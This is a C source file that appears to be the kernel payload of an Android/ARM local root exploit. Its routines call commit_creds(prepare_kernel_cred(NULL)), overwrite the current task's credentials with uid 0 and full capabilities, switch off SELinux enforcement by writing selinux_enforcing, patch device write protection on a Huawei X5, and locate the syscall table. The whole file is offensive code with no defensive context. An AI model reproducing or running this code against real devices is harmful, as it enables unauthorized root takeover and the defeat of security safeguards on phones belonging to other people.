#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>


#define KERNEL_START     0xc0008000

extern unsigned long lookup_sym(const char *name);

int (*my_printk)(const char *fmt, ...) = NULL;
void (*my_selnl_notify_setenforce)(int val) = NULL;
void (*my_selinux_status_update_setenforce)(int enforcing) = NULL;

struct task_struct;
extern int socket_fd_exploit;

struct kernel_cap_struct {
	unsigned long cap[2];
};

struct cred {
	unsigned long usage;
	uid_t uid;
	gid_t gid;
	uid_t suid;
	gid_t sgid;
	uid_t euid;
	gid_t egid;
	uid_t fsuid;
	gid_t fsgid;
	unsigned long securebits;
	struct kernel_cap_struct cap_inheritable;
	struct kernel_cap_struct cap_permitted;
	struct kernel_cap_struct cap_effective;
	struct kernel_cap_struct cap_bset;
	unsigned char jit_keyring;
	void *thread_keyring;
	void *request_key_auth;
	void *tgcred;
	struct task_security_struct *security;

	/* ... */
};

struct list_head {
	struct list_head *next;
	struct list_head *prev;
};

struct task_security_struct {
	unsigned long osid;
	unsigned long sid;
	unsigned long exec_sid;
	unsigned long create_sid;
	unsigned long keycreate_sid;
	unsigned long sockcreate_sid;
};


struct task_struct_partial {
	struct list_head cpu_timers[3];
	struct cred *real_cred;
	struct cred *cred;
	struct cred *replacement_session_keyring;
	char comm[16];
};

static void shutdown_selinux()
{
	int *selinux_enforce = NULL;

	selinux_enforce = lookup_sym("selinux_enforcing");
	my_selnl_notify_setenforce = lookup_sym("selnl_notify_setenforce");
	my_selinux_status_update_setenforce = lookup_sym("selinux_status_update_setenforce");
	if (selinux_enforce && *selinux_enforce == 1) {
		*selinux_enforce = 0;
                if (my_selnl_notify_setenforce && my_selinux_status_update_setenforce) {
                        my_selnl_notify_setenforce(0);
                        my_selinux_status_update_setenforce(0);
                }

	}
}


int root_by_commit_cred()
{
        struct cred *(*my_prepare_kernel_cred)(struct task_struct *daemon) = NULL;

        int (*my_commit_creds)(struct cred *new) = NULL;

        struct file;
        struct file * (*my_fget) (unsigned int fd) = NULL;

        my_printk = lookup_sym("printk");
        if (my_printk) {
                my_printk("CALLED in kernel OK!\n");
        }
        /* walkaround for sock tag */
        my_fget = lookup_sym("fget");
        my_prepare_kernel_cred = lookup_sym("prepare_kernel_cred");
        my_commit_creds = lookup_sym("commit_creds");
        if (my_prepare_kernel_cred && my_commit_creds) {
                my_commit_creds(my_prepare_kernel_cred(NULL));
                shutdown_selinux();
                if (my_fget) {
                        my_fget(socket_fd_exploit);
                }
                return 0;
        }
        return 1;
}

/* for HUAWEI X5 */
int mod_wp()
{
        unsigned long *p;
        unsigned long *end;
        unsigned long tmp;
        unsigned long *t;

        p = (unsigned long*)lookup_sym("submit_bio");
        if (!p) {
                my_printk("can not find symbol addr!\n");
                return 0;
        }

        end = p + (0x400 / sizeof(unsigned long*));
        while(p < end) {

                if ((*p & ~0xfff) == 0xe59f1000) {
                        if ((*(p + 1) & 0xff000000) == 0xeb000000) {
                                tmp = *p << 20;
                                t = (unsigned long *)((tmp >> 20) + (unsigned long)p);
                                t = (unsigned long *)*(t + 2);
                                if (*t == 0x41414141) {
                                        return 2;
                                }
                                else if (*t == 0x62636d6d) {
                                        *t = 0x41414141;
                                        return 1;
                                }
                        }
                }
                p++;
        }
        return 0;
}

int test()
{
        my_printk = lookup_sym("printk");
        if (my_printk) {
                my_printk("invoke OK!\n");
                //return 123;
        }
        return 0;
}

int root_by_set_cred(void)
{
        unsigned long s;
        unsigned long *taskbuf;
        struct task_struct_partial *task;
        struct cred *cred = NULL;
        struct task_security_struct *security;
        int i;

        __asm__ ("mov %0,sp"
              :"=r"(s)
                );

        s &= ~0x1fff;

        taskbuf = (unsigned long *)*(unsigned long*)(s + 0xc);

        for (i = 0; i < 0x100; i++) {
                task = (struct task_struct_partial *)(taskbuf + i);
                if (task->cpu_timers[0].next == task->cpu_timers[0].prev
                    && (unsigned long)task->cpu_timers[0].next > KERNEL_START
                    && task->cpu_timers[1].next == task->cpu_timers[1].prev
                    && (unsigned long)task->cpu_timers[1].next > KERNEL_START
                    && task->cpu_timers[2].next == task->cpu_timers[2].prev
                    && (unsigned long)task->cpu_timers[2].next > KERNEL_START
                    && task->real_cred == task->cred) {
                        cred = task->cred;
                        break;
                }
        }

        if (cred == NULL)
                return 1;

        security = cred->security;
        if ((unsigned long)security > KERNEL_START
            && (unsigned long)security < 0xffff0000) {
                if (security->osid != 0
                    && security->sid != 0
                    && security->exec_sid == 0
                    && security->create_sid == 0
                    && security->keycreate_sid == 0
                    && security->sockcreate_sid == 0) {
                        security->osid = 1;
                        security->sid = 1;

                }
        }

        cred->uid = 0;
        cred->gid = 0;
        cred->suid = 0;
        cred->sgid = 0;
        cred->euid = 0;
        cred->egid = 0;
        cred->fsuid = 0;
        cred->fsgid = 0;

        cred->cap_inheritable.cap[0] = 0xffffffff;
        cred->cap_inheritable.cap[1] = 0xffffffff;
        cred->cap_permitted.cap[0] = 0xffffffff;
        cred->cap_permitted.cap[1] = 0xffffffff;
        cred->cap_effective.cap[0] = 0xffffffff;
        cred->cap_effective.cap[1] = 0xffffffff;
        cred->cap_bset.cap[0] = 0xffffffff;
        cred->cap_bset.cap[1] = 0xffffffff;

        shutdown_selinux();
        return 0;
}

unsigned long find_syscall_table()
{
        int ret;
        unsigned long addr;

        addr = 0xffff0008 + 8 + (*(unsigned long*)0xffff0008 & 0xfff);
        addr = *(unsigned long*)addr;

        //ret = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
        ret = prctl(21, 0, 0, 0, 0);
        if (ret > 0)
                addr += 0x18;
        /* ret = syscall(__NR_semop, , 0, 0); */
        /* printf("ret = %d\n", ret); */
        /* if (ret == -1) */
        /*         perror("semop:"); */

        /* vector_swi +  __sys_trace  + __sys_trace_return  */
        addr += 0x74 + 0x2c + 0x18;
        addr = (addr + (1 << 5) - 1) & ~0x1f;  /* align 5: __cr_alignment */
        addr += 0x4;            /* + _cr_alignment */

        return addr;
}
